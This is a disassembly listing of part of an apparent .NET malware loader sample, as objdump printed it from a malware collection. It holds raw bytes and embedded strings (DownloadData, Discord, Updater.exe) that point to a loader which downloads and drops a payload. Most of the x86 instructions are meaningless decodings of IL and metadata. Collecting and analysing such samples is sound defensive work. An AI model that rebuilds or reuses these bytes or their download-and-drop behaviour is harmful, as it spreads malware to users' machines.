
malware_samples/loader/e4dcead9d58de1edb041678f4437de4a43dcef1ba6e16a6e3cf4cebc8250d6ac.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	5c                   	pop    %esp
  402001:	2a 00                	sub    (%eax),%al
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 28 21 00       	add    $0x212800,%eax
  402013:	00 68 08             	add    %ch,0x8(%eax)
  402016:	00 00                	add    %al,(%eax)
  402018:	01 00                	add    %eax,(%eax)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	02 00                	add    (%eax),%al
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	13 30                	adc    (%eax),%esi
  402052:	02 00                	add    (%eax),%al
  402054:	50                   	push   %eax
  402055:	00 00                	add    %al,(%eax)
  402057:	00 00                	add    %al,(%eax)
  402059:	00 00                	add    %al,(%eax)
  40205b:	00 1f                	add    %bl,(%edi)
  40205d:	28 28                	sub    %ch,(%eax)
  40205f:	0f 00 00             	sldt   (%eax)
  402062:	0a 80 01 00 00 04    	or     0x4000001(%eax),%al
  402068:	1f                   	pop    %ds
  402069:	1c 28                	sbb    $0x28,%al
  40206b:	0f 00 00             	sldt   (%eax)
  40206e:	0a 72 01             	or     0x1(%edx),%dh
  402071:	00 00                	add    %al,(%eax)
  402073:	70 28                	jo     0x40209d
  402075:	10 00                	adc    %al,(%eax)
  402077:	00 0a                	add    %cl,(%edx)
  402079:	80 02 00             	addb   $0x0,(%edx)
  40207c:	00 04 72             	add    %al,(%edx,%esi,2)
  40207f:	13 00                	adc    (%eax),%eax
  402081:	00 70 28             	add    %dh,0x28(%eax)
  402084:	11 00                	adc    %eax,(%eax)
  402086:	00 0a                	add    %cl,(%edx)
  402088:	72 2f                	jb     0x4020b9
  40208a:	00 00                	add    %al,(%eax)
  40208c:	70 28                	jo     0x4020b6
  40208e:	10 00                	adc    %al,(%eax)
  402090:	00 0a                	add    %cl,(%edx)
  402092:	80 03 00             	addb   $0x0,(%ebx)
  402095:	00 04 7e             	add    %al,(%esi,%edi,2)
  402098:	03 00                	add    (%eax),%eax
  40209a:	00 04 72             	add    %al,(%edx,%esi,2)
  40209d:	4b                   	dec    %ebx
  40209e:	00 00                	add    %al,(%eax)
  4020a0:	70 28                	jo     0x4020ca
  4020a2:	10 00                	adc    %al,(%eax)
  4020a4:	00 0a                	add    %cl,(%edx)
  4020a6:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  4020aa:	04 2a                	add    $0x2a,%al
  4020ac:	13 30                	adc    (%eax),%esi
  4020ae:	03 00                	add    (%eax),%eax
  4020b0:	67 00 00             	add    %al,(%bx,%si)
  4020b3:	00 01                	add    %al,(%ecx)
  4020b5:	00 00                	add    %al,(%eax)
  4020b7:	11 00                	adc    %eax,(%eax)
  4020b9:	7e 01                	jle    0x4020bc
  4020bb:	00 00                	add    %al,(%eax)
  4020bd:	04 72                	add    $0x72,%al
  4020bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4020c0:	00 00                	add    %al,(%eax)
  4020c2:	70 28                	jo     0x4020ec
  4020c4:	10 00                	adc    %al,(%eax)
  4020c6:	00 0a                	add    %cl,(%edx)
  4020c8:	28 12                	sub    %dl,(%edx)
  4020ca:	00 00                	add    %al,(%eax)
  4020cc:	0a 16                	or     (%esi),%dl
  4020ce:	fe 01                	incb   (%ecx)
  4020d0:	0b 07                	or     (%edi),%eax
  4020d2:	2c 07                	sub    $0x7,%al
  4020d4:	16                   	push   %ss
  4020d5:	28 13                	sub    %dl,(%ebx)
  4020d7:	00 00                	add    %al,(%eax)
  4020d9:	0a 00                	or     (%eax),%al
  4020db:	7e 03                	jle    0x4020e0
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 28                	add    $0x28,%al
  4020e1:	12 00                	adc    (%eax),%al
  4020e3:	00 0a                	add    %cl,(%edx)
  4020e5:	16                   	push   %ss
  4020e6:	fe 01                	incb   (%ecx)
  4020e8:	0c 08                	or     $0x8,%al
  4020ea:	2c 0b                	sub    $0xb,%al
  4020ec:	7e 03                	jle    0x4020f1
  4020ee:	00 00                	add    %al,(%eax)
  4020f0:	04 28                	add    $0x28,%al
  4020f2:	14 00                	adc    $0x0,%al
  4020f4:	00 0a                	add    %cl,(%edx)
  4020f6:	26 73 15             	es jae 0x40210e
  4020f9:	00 00                	add    %al,(%eax)
  4020fb:	0a 0a                	or     (%edx),%cl
  4020fd:	7e 04                	jle    0x402103
  4020ff:	00 00                	add    %al,(%eax)
  402101:	04 06                	add    $0x6,%al
  402103:	72 7f                	jb     0x402184
  402105:	00 00                	add    %al,(%eax)
  402107:	70 6f                	jo     0x402178
  402109:	16                   	push   %ss
  40210a:	00 00                	add    %al,(%eax)
  40210c:	0a 28                	or     (%eax),%ch
  40210e:	17                   	pop    %ss
  40210f:	00 00                	add    %al,(%eax)
  402111:	0a 00                	or     (%eax),%al
  402113:	7e 04                	jle    0x402119
  402115:	00 00                	add    %al,(%eax)
  402117:	04 28                	add    $0x28,%al
  402119:	18 00                	sbb    %al,(%eax)
  40211b:	00 0a                	add    %cl,(%edx)
  40211d:	26 2a 22             	sub    %es:(%edx),%ah
  402120:	02 28                	add    (%eax),%ch
  402122:	19 00                	sbb    %eax,(%eax)
  402124:	00 0a                	add    %cl,(%edx)
  402126:	00 2a                	add    %ch,(%edx)
  402128:	42                   	inc    %edx
  402129:	53                   	push   %ebx
  40212a:	4a                   	dec    %edx
  40212b:	42                   	inc    %edx
  40212c:	01 00                	add    %eax,(%eax)
  40212e:	01 00                	add    %eax,(%eax)
  402130:	00 00                	add    %al,(%eax)
  402132:	00 00                	add    %al,(%eax)
  402134:	0c 00                	or     $0x0,%al
  402136:	00 00                	add    %al,(%eax)
  402138:	76 34                	jbe    0x40216e
  40213a:	2e 30 2e             	xor    %ch,%cs:(%esi)
  40213d:	33 30                	xor    (%eax),%esi
  40213f:	33 31                	xor    (%ecx),%esi
  402141:	39 00                	cmp    %eax,(%eax)
  402143:	00 00                	add    %al,(%eax)
  402145:	00 05 00 6c 00 00    	add    %al,0x6c00
  40214b:	00 84 02 00 00 23 7e 	add    %al,0x7e230000(%edx,%eax,1)
  402152:	00 00                	add    %al,(%eax)
  402154:	f0 02 00             	lock add (%eax),%al
  402157:	00 38                	add    %bh,(%eax)
  402159:	03 00                	add    (%eax),%eax
  40215b:	00 23                	add    %ah,(%ebx)
  40215d:	53                   	push   %ebx
  40215e:	74 72                	je     0x4021d2
  402160:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  402167:	00 28                	add    %ch,(%eax)
  402169:	06                   	push   %es
  40216a:	00 00                	add    %al,(%eax)
  40216c:	d0 00                	rolb   $1,(%eax)
  40216e:	00 00                	add    %al,(%eax)
  402170:	23 55 53             	and    0x53(%ebp),%edx
  402173:	00 f8                	add    %bh,%al
  402175:	06                   	push   %es
  402176:	00 00                	add    %al,(%eax)
  402178:	10 00                	adc    %al,(%eax)
  40217a:	00 00                	add    %al,(%eax)
  40217c:	23 47 55             	and    0x55(%edi),%eax
  40217f:	49                   	dec    %ecx
  402180:	44                   	inc    %esp
  402181:	00 00                	add    %al,(%eax)
  402183:	00 08                	add    %cl,(%eax)
  402185:	07                   	pop    %es
  402186:	00 00                	add    %al,(%eax)
  402188:	60                   	pusha
  402189:	01 00                	add    %eax,(%eax)
  40218b:	00 23                	add    %ah,(%ebx)
  40218d:	42                   	inc    %edx
  40218e:	6c                   	insb   (%dx),%es:(%edi)
  40218f:	6f                   	outsl  %ds:(%esi),(%dx)
  402190:	62 00                	bound  %eax,(%eax)
  402192:	00 00                	add    %al,(%eax)
  402194:	00 00                	add    %al,(%eax)
  402196:	00 00                	add    %al,(%eax)
  402198:	02 00                	add    (%eax),%al
  40219a:	00 01                	add    %al,(%ecx)
  40219c:	57                   	push   %edi
  40219d:	94                   	xchg   %eax,%esp
  40219e:	02 00                	add    (%eax),%al
  4021a0:	09 00                	or     %eax,(%eax)
  4021a2:	00 00                	add    %al,(%eax)
  4021a4:	00 fa                	add    %bh,%dl
  4021a6:	01 33                	add    %esi,(%ebx)
  4021a8:	00 16                	add    %dl,(%esi)
  4021aa:	00 00                	add    %al,(%eax)
  4021ac:	01 00                	add    %eax,(%eax)
  4021ae:	00 00                	add    %al,(%eax)
  4021b0:	19 00                	sbb    %eax,(%eax)
  4021b2:	00 00                	add    %al,(%eax)
  4021b4:	03 00                	add    (%eax),%eax
  4021b6:	00 00                	add    %al,(%eax)
  4021b8:	04 00                	add    $0x0,%al
  4021ba:	00 00                	add    %al,(%eax)
  4021bc:	03 00                	add    (%eax),%eax
  4021be:	00 00                	add    %al,(%eax)
  4021c0:	19 00                	sbb    %eax,(%eax)
  4021c2:	00 00                	add    %al,(%eax)
  4021c4:	0e                   	push   %cs
  4021c5:	00 00                	add    %al,(%eax)
  4021c7:	00 01                	add    %al,(%ecx)
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	00 01                	add    %al,(%ecx)
  4021cd:	00 00                	add    %al,(%eax)
  4021cf:	00 01                	add    %al,(%ecx)
  4021d1:	00 00                	add    %al,(%eax)
  4021d3:	00 02                	add    %al,(%edx)
  4021d5:	00 00                	add    %al,(%eax)
  4021d7:	00 00                	add    %al,(%eax)
  4021d9:	00 b1 01 01 00 00    	add    %dh,0x101(%ecx)
  4021df:	00 00                	add    %al,(%eax)
  4021e1:	00 06                	add    %al,(%esi)
  4021e3:	00 26                	add    %ah,(%esi)
  4021e5:	01 7e 02             	add    %edi,0x2(%esi)
  4021e8:	06                   	push   %es
  4021e9:	00 93 01 7e 02 06    	add    %dl,0x6027e01(%ebx)
  4021ef:	00 5a 00             	add    %bl,0x0(%edx)
  4021f2:	4c                   	dec    %esp
  4021f3:	02 0f                	add    (%edi),%cl
  4021f5:	00 9e 02 00 00 06    	add    %bl,0x6000002(%esi)
  4021fb:	00 82 00 09 02 06    	add    %al,0x6020900(%edx)
  402201:	00 09                	add    %cl,(%ecx)
  402203:	01 09                	add    %ecx,(%ecx)
  402205:	02 06                	add    (%esi),%al
  402207:	00 ea                	add    %ch,%dl
  402209:	00 09                	add    %cl,(%ecx)
  40220b:	02 06                	add    (%esi),%al
  40220d:	00 7a 01             	add    %bh,0x1(%edx)
  402210:	09 02                	or     %eax,(%edx)
  402212:	06                   	push   %es
  402213:	00 46 01             	add    %al,0x1(%esi)
  402216:	09 02                	or     %eax,(%edx)
  402218:	06                   	push   %es
  402219:	00 5f 01             	add    %bl,0x1(%edi)
  40221c:	09 02                	or     %eax,(%edx)
  40221e:	06                   	push   %es
  40221f:	00 99 00 09 02 06    	add    %bl,0x6020900(%ecx)
  402225:	00 6e 00             	add    %ch,0x0(%esi)
  402228:	5f                   	pop    %edi
  402229:	02 06                	add    (%esi),%al
  40222b:	00 4c 00 5f          	add    %cl,0x5f(%eax,%eax,1)
  40222f:	02 06                	add    (%esi),%al
  402231:	00 cd                	add    %cl,%ch
  402233:	00 09                	add    %cl,(%ecx)
  402235:	02 06                	add    (%esi),%al
  402237:	00 b4 00 c6 01 06 00 	add    %dh,0x601c6(%eax,%eax,1)
  40223e:	42                   	inc    %edx
  40223f:	00 fd                	add    %bh,%ch
  402241:	01 06                	add    %eax,(%esi)
  402243:	00 f2                	add    %dh,%dl
  402245:	02 fd                	add    %ch,%bh
  402247:	01 0a                	add    %ecx,(%edx)
  402249:	00 09                	add    %cl,(%ecx)
  40224b:	03 f9                	add    %ecx,%edi
  40224d:	02 06                	add    (%esi),%al
  40224f:	00 13                	add    %dl,(%ebx)
  402251:	03 fd                	add    %ebp,%edi
  402253:	01 4f 00             	add    %ecx,0x0(%edi)
  402256:	29 02                	sub    %eax,(%edx)
  402258:	00 00                	add    %al,(%eax)
  40225a:	06                   	push   %es
  40225b:	00 e0                	add    %ah,%al
  40225d:	01 fd                	add    %edi,%ebp
  40225f:	01 06                	add    %eax,(%esi)
  402261:	00 2b                	add    %ch,(%ebx)
  402263:	03 0a                	add    (%edx),%ecx
  402265:	00 06                	add    %al,(%esi)
  402267:	00 1b                	add    %bl,(%ebx)
  402269:	02 0a                	add    (%edx),%cl
  40226b:	00 06                	add    %al,(%esi)
  40226d:	00 32                	add    %dh,(%edx)
  40226f:	00 0a                	add    %cl,(%edx)
  402271:	00 0a                	add    %cl,(%edx)
  402273:	00 dc                	add    %bl,%ah
  402275:	02 4c 02 00          	add    0x0(%edx,%eax,1),%cl
  402279:	00 00                	add    %al,(%eax)
  40227b:	00 01                	add    %al,(%ecx)
  40227d:	00 00                	add    %al,(%eax)
  40227f:	00 00                	add    %al,(%eax)
  402281:	00 01                	add    %al,(%ecx)
  402283:	00 01                	add    %al,(%ecx)
  402285:	00 08                	add    %cl,(%eax)
  402287:	01 10                	add    %edx,(%eax)
  402289:	00 d6                	add    %dl,%dh
  40228b:	02 37                	add    (%edi),%dh
  40228d:	00 41 00             	add    %al,0x0(%ecx)
  402290:	01 00                	add    %eax,(%eax)
  402292:	01 00                	add    %eax,(%eax)
  402294:	00 00                	add    %al,(%eax)
  402296:	10 00                	adc    %al,(%eax)
  402298:	f5                   	cmc
  402299:	01 37                	add    %esi,(%edi)
  40229b:	00 45 00             	add    %al,0x0(%ebp)
  40229e:	05 00 02 00 16       	add    $0x16000200,%eax
  4022a3:	00 bd 01 5e 00 16    	add    %bh,0x16005e01(%ebp)
  4022a9:	00 2a                	add    %ch,(%edx)
  4022ab:	00 5e 00             	add    %bl,0x0(%esi)
  4022ae:	16                   	push   %ss
  4022af:	00 f0                	add    %dh,%al
  4022b1:	01 5e 00             	add    %ebx,0x0(%esi)
  4022b4:	16                   	push   %ss
  4022b5:	00 32                	add    %dh,(%edx)
  4022b7:	00 5e 00             	add    %bl,0x0(%esi)
  4022ba:	50                   	push   %eax
  4022bb:	20 00                	and    %al,(%eax)
  4022bd:	00 00                	add    %al,(%eax)
  4022bf:	00 91 18 45 02 61    	add    %dl,0x61024518(%ecx)
  4022c5:	00 01                	add    %al,(%ecx)
  4022c7:	00 ac 20 00 00 00 00 	add    %ch,0x0(%eax,%eiz,1)
  4022ce:	91                   	xchg   %eax,%ecx
  4022cf:	00 04 02             	add    %al,(%edx,%eax,1)
  4022d2:	61                   	popa
  4022d3:	00 01                	add    %al,(%ecx)
  4022d5:	00 1f                	add    %bl,(%edi)
  4022d7:	21 00                	and    %eax,(%eax)
  4022d9:	00 00                	add    %al,(%eax)
  4022db:	00 86 18 3f 02 06    	add    %al,0x6023f18(%esi)
  4022e1:	00 01                	add    %al,(%ecx)
  4022e3:	00 09                	add    %cl,(%ecx)
  4022e5:	00 3f                	add    %bh,(%edi)
  4022e7:	02 01                	add    (%ecx),%al
  4022e9:	00 11                	add    %dl,(%ecx)
  4022eb:	00 3f                	add    %bh,(%edi)
  4022ed:	02 06                	add    (%esi),%al
  4022ef:	00 19                	add    %bl,(%ecx)
  4022f1:	00 3f                	add    %bh,(%edi)
  4022f3:	02 0a                	add    (%edx),%cl
  4022f5:	00 29                	add    %ch,(%ecx)
  4022f7:	00 3f                	add    %bh,(%edi)
  4022f9:	02 10                	add    (%eax),%dl
  4022fb:	00 31                	add    %dh,(%ecx)
  4022fd:	00 3f                	add    %bh,(%edi)
  4022ff:	02 10                	add    (%eax),%dl
  402301:	00 39                	add    %bh,(%ecx)
  402303:	00 3f                	add    %bh,(%edi)
  402305:	02 10                	add    (%eax),%dl
  402307:	00 41 00             	add    %al,0x0(%ecx)
  40230a:	3f                   	aas
  40230b:	02 10                	add    (%eax),%dl
  40230d:	00 49 00             	add    %cl,0x0(%ecx)
  402310:	3f                   	aas
  402311:	02 10                	add    (%eax),%dl
  402313:	00 51 00             	add    %dl,0x0(%ecx)
  402316:	3f                   	aas
  402317:	02 10                	add    (%eax),%dl
  402319:	00 59 00             	add    %bl,0x0(%ecx)
  40231c:	3f                   	aas
  40231d:	02 10                	add    (%eax),%dl
  40231f:	00 61 00             	add    %ah,0x0(%ecx)
  402322:	3f                   	aas
  402323:	02 15 00 69 00 3f    	add    0x3f006900,%dl
  402329:	02 10                	add    (%eax),%dl
  40232b:	00 71 00             	add    %dh,0x0(%ecx)
  40232e:	3f                   	aas
  40232f:	02 10                	add    (%eax),%dl
  402331:	00 79 00             	add    %bh,0x0(%ecx)
  402334:	3f                   	aas
  402335:	02 10                	add    (%eax),%dl
  402337:	00 99 00 e7 01 1a    	add    %bl,0x1a01e700(%ecx)
  40233d:	00 a9 00 eb 02 20    	add    %ch,0x2002eb00(%ecx)
  402343:	00 99 00 ad 02 26    	add    %bl,0x2602ad00(%ecx)
  402349:	00 b1 00 e4 02 32    	add    %dh,0x3202e400(%ecx)
  40234f:	00 99 00 04 03 37    	add    %bl,0x37030400(%ecx)
  402355:	00 b1 00 25 03 3c    	add    %dh,0x3c032500(%ecx)
  40235b:	00 91 00 3f 02 06    	add    %dl,0x6023f00(%ecx)
  402361:	00 91 00 14 00 42    	add    %dl,0x42001400(%ecx)
  402367:	00 c1                	add    %al,%cl
  402369:	00 c8                	add    %cl,%al
  40236b:	02 48 00             	add    0x0(%eax),%cl
  40236e:	c9                   	leave
  40236f:	00 1f                	add    %bl,(%edi)
  402371:	03 4f 00             	add    0x0(%edi),%ecx
  402374:	89 00                	mov    %eax,(%eax)
  402376:	3f                   	aas
  402377:	02 06                	add    (%esi),%al
  402379:	00 2e                	add    %ch,(%esi)
  40237b:	00 0b                	add    %cl,(%ebx)
  40237d:	00 65 00             	add    %ah,0x0(%ebp)
  402380:	2e 00 13             	add    %dl,%cs:(%ebx)
  402383:	00 6e 00             	add    %ch,0x0(%esi)
  402386:	2e 00 1b             	add    %bl,%cs:(%ebx)
  402389:	00 8d 00 2e 00 23    	add    %cl,0x23002e00(%ebp)
  40238f:	00 96 00 2e 00 2b    	add    %dl,0x2b002e00(%esi)
  402395:	00 a6 00 2e 00 33    	add    %ah,0x33002e00(%esi)
  40239b:	00 a6 00 2e 00 3b    	add    %ah,0x3b002e00(%esi)
  4023a1:	00 ac 00 2e 00 43 00 	add    %ch,0x43002e(%eax,%eax,1)
  4023a8:	96                   	xchg   %eax,%esi
  4023a9:	00 2e                	add    %ch,(%esi)
  4023ab:	00 4b 00             	add    %cl,0x0(%ebx)
  4023ae:	bc 00 2e 00 53       	mov    $0x53002e00,%esp
  4023b3:	00 a6 00 2e 00 5b    	add    %ah,0x5b002e00(%esi)
  4023b9:	00 a6 00 2e 00 63    	add    %ah,0x63002e00(%esi)
  4023bf:	00 de                	add    %bl,%dh
  4023c1:	00 2e                	add    %ch,(%esi)
  4023c3:	00 6b 00             	add    %ch,0x0(%ebx)
  4023c6:	08 01                	or     %al,(%ecx)
  4023c8:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  4023cc:	15 01 00 00 01       	adc    $0x1000001,%eax
  4023d1:	00 00                	add    %al,(%eax)
  4023d3:	00 02                	add    %al,(%edx)
  4023d5:	00 2b                	add    %ch,(%ebx)
  4023d7:	00 04 80             	add    %al,(%eax,%eax,4)
  4023da:	00 00                	add    %al,(%eax)
  4023dc:	01 00                	add    %eax,(%eax)
	...
  4023ea:	37                   	aaa
  4023eb:	02 00                	add    (%eax),%al
  4023ed:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4023f8:	00 00                	add    %al,(%eax)
  4023fa:	55                   	push   %ebp
  4023fb:	00 21                	add    %ah,(%ecx)
  4023fd:	00 00                	add    %al,(%eax)
  4023ff:	00 00                	add    %al,(%eax)
  402401:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40240c:	00 00                	add    %al,(%eax)
  40240e:	55                   	push   %ebp
  40240f:	00 fd                	add    %bh,%ch
  402411:	01 00                	add    %eax,(%eax)
  402413:	00 00                	add    %al,(%eax)
  402415:	00 00                	add    %al,(%eax)
  402417:	00 00                	add    %al,(%eax)
  402419:	3c 4d                	cmp    $0x4d,%al
  40241b:	6f                   	outsl  %ds:(%esi),(%dx)
  40241c:	64 75 6c             	fs jne 0x40248b
  40241f:	65 3e 00 53 79       	gs add %dl,%ds:0x79(%ebx)
  402424:	73 74                	jae    0x40249a
  402426:	65 6d                	gs insl (%dx),%es:(%edi)
  402428:	2e 49                	cs dec %ecx
  40242a:	4f                   	dec    %edi
  40242b:	00 44 6f 77          	add    %al,0x77(%edi,%ebp,2)
  40242f:	6e                   	outsb  %ds:(%esi),(%dx)
  402430:	6c                   	insb   (%dx),%es:(%edi)
  402431:	6f                   	outsl  %ds:(%esi),(%dx)
  402432:	61                   	popa
  402433:	64 44                	fs inc %esp
  402435:	61                   	popa
  402436:	74 61                	je     0x402499
  402438:	00 6d 73             	add    %ch,0x73(%ebp)
  40243b:	63 6f 72             	arpl   %ebp,0x72(%edi)
  40243e:	6c                   	insb   (%dx),%es:(%edi)
  40243f:	69 62 00 44 69 73 63 	imul   $0x63736944,0x0(%edx),%esp
  402446:	6f                   	outsl  %ds:(%esi),(%dx)
  402447:	72 64                	jb     0x4024ad
  402449:	00 46 69             	add    %al,0x69(%esi)
  40244c:	6c                   	insb   (%dx),%es:(%edi)
  40244d:	65 00 42 6f          	add    %al,%gs:0x6f(%edx)
  402451:	72 64                	jb     0x4024b7
  402453:	65 72 4c             	gs jb  0x4024a2
  402456:	69 6e 65 00 56 61 6c 	imul   $0x6c615600,0x65(%esi),%ebp
  40245d:	75 65                	jne    0x4024c4
  40245f:	54                   	push   %esp
  402460:	79 70                	jns    0x4024d2
  402462:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  402466:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  40246d:	62 
  40246e:	75 74                	jne    0x4024e4
  402470:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  402475:	75 67                	jne    0x4024de
  402477:	67 61                	addr16 popa
  402479:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  40247d:	74 74                	je     0x4024f3
  40247f:	72 69                	jb     0x4024ea
  402481:	62 75 74             	bound  %esi,0x74(%ebp)
  402484:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  402488:	6d                   	insl   (%dx),%es:(%edi)
  402489:	56                   	push   %esi
  40248a:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  402491:	74 74                	je     0x402507
  402493:	72 69                	jb     0x4024fe
  402495:	62 75 74             	bound  %esi,0x74(%ebp)
  402498:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40249c:	73 65                	jae    0x402503
  40249e:	6d                   	insl   (%dx),%es:(%edi)
  40249f:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4024a3:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  4024aa:	72 
  4024ab:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  4024b2:	73 73                	jae    0x402527
  4024b4:	65 6d                	gs insl (%dx),%es:(%edi)
  4024b6:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4024ba:	72 61                	jb     0x40251d
  4024bc:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  4024bf:	61                   	popa
  4024c0:	72 6b                	jb     0x40252d
  4024c2:	41                   	inc    %ecx
  4024c3:	74 74                	je     0x402539
  4024c5:	72 69                	jb     0x402530
  4024c7:	62 75 74             	bound  %esi,0x74(%ebp)
  4024ca:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  4024cf:	67 65 74 46          	addr16 gs je 0x402519
  4024d3:	72 61                	jb     0x402536
  4024d5:	6d                   	insl   (%dx),%es:(%edi)
  4024d6:	65 77 6f             	gs ja  0x402548
  4024d9:	72 6b                	jb     0x402546
  4024db:	41                   	inc    %ecx
  4024dc:	74 74                	je     0x402552
  4024de:	72 69                	jb     0x402549
  4024e0:	62 75 74             	bound  %esi,0x74(%ebp)
  4024e3:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4024e7:	73 65                	jae    0x40254e
  4024e9:	6d                   	insl   (%dx),%es:(%edi)
  4024ea:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4024ee:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4024f5:	69 
  4024f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4024f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4024f8:	41                   	inc    %ecx
  4024f9:	74 74                	je     0x40256f
  4024fb:	72 69                	jb     0x402566
  4024fd:	62 75 74             	bound  %esi,0x74(%ebp)
  402500:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402504:	73 65                	jae    0x40256b
  402506:	6d                   	insl   (%dx),%es:(%edi)
  402507:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40250b:	6f                   	outsl  %ds:(%esi),(%dx)
  40250c:	6e                   	outsb  %ds:(%esi),(%dx)
  40250d:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  402513:	74 69                	je     0x40257e
  402515:	6f                   	outsl  %ds:(%esi),(%dx)
  402516:	6e                   	outsb  %ds:(%esi),(%dx)
  402517:	41                   	inc    %ecx
  402518:	74 74                	je     0x40258e
  40251a:	72 69                	jb     0x402585
  40251c:	62 75 74             	bound  %esi,0x74(%ebp)
  40251f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402523:	73 65                	jae    0x40258a
  402525:	6d                   	insl   (%dx),%es:(%edi)
  402526:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  40252a:	65 73 63             	gs jae 0x402590
  40252d:	72 69                	jb     0x402598
  40252f:	70 74                	jo     0x4025a5
  402531:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  402538:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  40253f:	6f                   	outsl  %ds:(%esi),(%dx)
  402540:	6d                   	insl   (%dx),%es:(%edi)
  402541:	70 69                	jo     0x4025ac
  402543:	6c                   	insb   (%dx),%es:(%edi)
  402544:	61                   	popa
  402545:	74 69                	je     0x4025b0
  402547:	6f                   	outsl  %ds:(%esi),(%dx)
  402548:	6e                   	outsb  %ds:(%esi),(%dx)
  402549:	52                   	push   %edx
  40254a:	65 6c                	gs insb (%dx),%es:(%edi)
  40254c:	61                   	popa
  40254d:	78 61                	js     0x4025b0
  40254f:	74 69                	je     0x4025ba
  402551:	6f                   	outsl  %ds:(%esi),(%dx)
  402552:	6e                   	outsb  %ds:(%esi),(%dx)
  402553:	73 41                	jae    0x402596
  402555:	74 74                	je     0x4025cb
  402557:	72 69                	jb     0x4025c2
  402559:	62 75 74             	bound  %esi,0x74(%ebp)
  40255c:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402560:	73 65                	jae    0x4025c7
  402562:	6d                   	insl   (%dx),%es:(%edi)
  402563:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  402567:	72 6f                	jb     0x4025d8
  402569:	64 75 63             	fs jne 0x4025cf
  40256c:	74 41                	je     0x4025af
  40256e:	74 74                	je     0x4025e4
  402570:	72 69                	jb     0x4025db
  402572:	62 75 74             	bound  %esi,0x74(%ebp)
  402575:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402579:	73 65                	jae    0x4025e0
  40257b:	6d                   	insl   (%dx),%es:(%edi)
  40257c:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  402580:	6f                   	outsl  %ds:(%esi),(%dx)
  402581:	70 79                	jo     0x4025fc
  402583:	72 69                	jb     0x4025ee
  402585:	67 68 74 41 74 74    	addr16 push $0x74744174
  40258b:	72 69                	jb     0x4025f6
  40258d:	62 75 74             	bound  %esi,0x74(%ebp)
  402590:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402594:	73 65                	jae    0x4025fb
  402596:	6d                   	insl   (%dx),%es:(%edi)
  402597:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40259b:	6f                   	outsl  %ds:(%esi),(%dx)
  40259c:	6d                   	insl   (%dx),%es:(%edi)
  40259d:	70 61                	jo     0x402600
  40259f:	6e                   	outsb  %ds:(%esi),(%dx)
  4025a0:	79 41                	jns    0x4025e3
  4025a2:	74 74                	je     0x402618
  4025a4:	72 69                	jb     0x40260f
  4025a6:	62 75 74             	bound  %esi,0x74(%ebp)
  4025a9:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4025ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4025ae:	74 69                	je     0x402619
  4025b0:	6d                   	insl   (%dx),%es:(%edi)
  4025b1:	65 43                	gs inc %ebx
  4025b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4025b4:	6d                   	insl   (%dx),%es:(%edi)
  4025b5:	70 61                	jo     0x402618
  4025b7:	74 69                	je     0x402622
  4025b9:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  4025bc:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  4025c3:	69 
  4025c4:	62 75 74             	bound  %esi,0x74(%ebp)
  4025c7:	65 00 55 70          	add    %dl,%gs:0x70(%ebp)
  4025cb:	64 61                	fs popa
  4025cd:	74 65                	je     0x402634
  4025cf:	72 2e                	jb     0x4025ff
  4025d1:	65 78 65             	gs js  0x402639
  4025d4:	00 55 73             	add    %dl,0x73(%ebp)
  4025d7:	65 72 50             	gs jb  0x40262a
  4025da:	72 6f                	jb     0x40264b
  4025dc:	66 00 53 79          	data16 add %dl,0x79(%ebx)
  4025e0:	73 74                	jae    0x402656
